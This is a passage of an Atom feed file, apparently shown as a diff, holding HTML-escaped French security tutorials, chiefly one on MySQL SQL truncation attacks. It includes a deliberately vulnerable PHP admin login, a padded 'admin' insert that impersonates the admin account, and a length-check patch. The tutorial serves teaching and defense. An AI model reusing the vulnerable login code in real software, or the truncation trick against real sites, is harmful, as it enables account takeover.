class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usr_password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;is_array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;usr_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon &lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="Journal de Geluchat"></category><category term="SQL"></category><category term="Tutoriel"></category><category term="Etude de cas"></category></entry><entry><title>Les SQL truncations : Une faille méconnue, mais très efficace</title><link href="https://www.dailysecurity.fr/les-sql-truncations" rel="alternate"></link><published>2015-01-30T11:35:00+01:00</published><updated>2015-01-30T11:35:00+01:00</updated><author><name>Geluchat</name></author><id>tag:www.dailysecurity.fr,2015-01-30:/les-sql-truncations</id><summary type="html">&lt;p&gt;Aujourd'hui, j'ai le plaisir de vous présenter le premier article du site, il concernera les SQL truncations. Il est très probable que vous n'en ayez jamais entendu parler car les failles liées à SQL sont noyées par les SQL injections et les bypass en tout genre.&lt;/p&gt;
+&lt;p&gt;Alors, une SQL truncation …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Aujourd'hui, j'ai le plaisir de vous présenter le premier article du site, il concernera les SQL truncations. Il est très probable que vous n'en ayez jamais entendu parler car les failles liées à SQL sont noyées par les SQL injections et les bypass en tout genre.&lt;/p&gt;
+&lt;p&gt;Alors, une SQL truncation, ça ressemble à quoi? Et bien, ça n'est pas très difficile à appréhender.&lt;/p&gt;
+&lt;p&gt;Prenons l'exemple du script SQL suivant:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;CREATE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;TABLE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NOT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;NULL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AUTO_INCREMENT&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;VARCHAR&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;CHAR&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;PRIMARY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;KEY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="k"&gt;INSERT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;INTO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;VALUES&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;admin                       x&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mdp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Avec un select de la table, on obtient:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="c1"&gt;---------+------------+&lt;/span&gt;
+&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="c1"&gt;---------+------------+&lt;/span&gt;
+&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;admin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;mdp&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="c1"&gt;---------+------------+&lt;/span&gt;
+&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;row&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;set&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sec&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Le résultat est sans appel, le login a été tronqué par mysql.  &lt;/p&gt;
+&lt;p&gt;Mais pourquoi? Pour les plus observateurs, vous aurez remarqué que le champ login est un varchar de 12 caractères, donc mysql ne réfléchit pas, il enregistre dans l'espace qu'on lui a réservé, d’où la troncation du login.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Remarque : MySQL efface les espaces derrière pour une raison d'optimisation de stockage.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Maintenant, à quoi ça sert?&lt;/p&gt;
+&lt;p&gt;Les exemples d'exploitation de cette faille sont multiples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;En cas d'une mauvaise gestion de l’accès au back office d'un site, comme avec un:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$_POST[password]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Suivi d'un test d'un type mysql_num_rows &amp;gt; 0 , l'utilisateur aurait accès au panel d’administration.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;    &lt;span class="nv"&gt;$db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mysql_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nb"&gt;mysql_select_db&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;TEST_DAILYSECURITYDB&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$db&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
+    &lt;span class="p"&gt;{&lt;/span&gt;
+       &lt;span class="nv"&gt;$sql&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;SELECT id FROM TEST_DAILYSECURITY WHERE login=&amp;#39;admin&amp;#39; AND password=&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nb"&gt;mysql_real_escape_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+       &lt;span class="nv"&gt;$req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mysql_query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$sql&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Erreur SQL !&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$sql&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nb"&gt;mysql_error&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+
+       &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;mysql_num_rows&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$req&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;// Si la requête retourne au moins un résultat, on accède à la zone administrateur&lt;/span&gt;
+       &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="c1"&gt;// ZONE ADMIN&lt;/span&gt;
+          &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Bienvenue Administrateur&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+       &lt;span class="p"&gt;}&lt;/span&gt;
+       &lt;span class="k"&gt;else&lt;/span&gt;
+       &lt;span class="p"&gt;{&lt;/span&gt;
+          &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Location: &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$_SERVER&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;HTTP_REFERER&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+          &lt;span class="k"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+       &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;
+    &lt;span class="p"&gt;{&lt;/span&gt;
+       &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;form action=&amp;quot;&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;               Password: &amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot;&amp;gt;&amp;lt;/ br&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;               &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;Se Connecter&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="s1"&gt;             &amp;lt;/form&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="nb"&gt;mysql_close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Un problème par requêtes multiples. On peut prendre comme exemple le &lt;a href="http://kitctf.de/writeups/gits2015/aart/"&gt;challenge aart&lt;/a&gt; de Ghost in the Shellcode qui avait deux requêtes insert à la suite, la deuxième utilisant une clause where sur un élément tronqué, un petit exemple:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;INSERT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;INTO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;VALUES&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$_POST[login]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$_POST[password]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;-- Si le login est supérieur à 12 il sera tronqué&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;INSERT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;INTO&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AUTRE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TABLE_AVEC_IDUSER&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;VALUES&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;,(&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;id&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;FROM&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;TEST_DAILYSECURITY&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;WHERE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$_POST[login]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="c1"&gt;-- Cette table contiendrait des données incorrectes, je vous laisse imaginer si c&amp;#39;était la table gérant les privilèges utilisateurs...&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On a donc pu voir que les SQL truncations sont très dangereuses et fortement méconnues. A savoir que la faille fonctionne aussi sous &lt;a href="https://pastebin.com/1g3es9nq"&gt;PDO&lt;/a&gt;.   &lt;/p&gt;
+&lt;p&gt;La solution, pour patcher cette faille, est très simple:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Veuillez rentrer un login inférieur à 12 caractères&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;else&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="c1"&gt;// Vérification connexion administrateur et formulaire de connexion&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Voila, c'est déjà terminé, n'hésitez pas à rejoindre mon &lt;a href="https://twitter.com/Geluchat"&gt;Twitter&lt;/a&gt; pour avoir des news sur le site et mon point de vue sur l'actualité de la sécurité informatique.&lt;/p&gt;
+&lt;p&gt;Geluchat.&lt;/p&gt;</content><category term="Journal de Geluchat"></category><category term="Failles Web"></category><category term="SQL"></category><category term="Tutoriel"></category></entry></feed>
